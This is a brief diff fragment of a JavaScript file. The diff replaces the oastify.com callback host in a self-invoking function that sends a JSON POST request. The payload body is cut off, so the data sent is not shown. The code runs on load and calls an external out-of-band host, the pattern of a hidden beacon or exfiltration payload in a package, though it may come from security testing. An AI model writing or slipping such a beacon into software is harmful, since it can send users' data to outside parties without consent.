@@ -1,6 +1,6 @@
 
 (function () {
-  fetch('https://jh40134z8r6d0c9sebkhm7tz1q7hv7jw.oastify.com', {
+  fetch('https://me47f5qiowbw8p5ywbvr4py4mvsmgc41.oastify.com', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
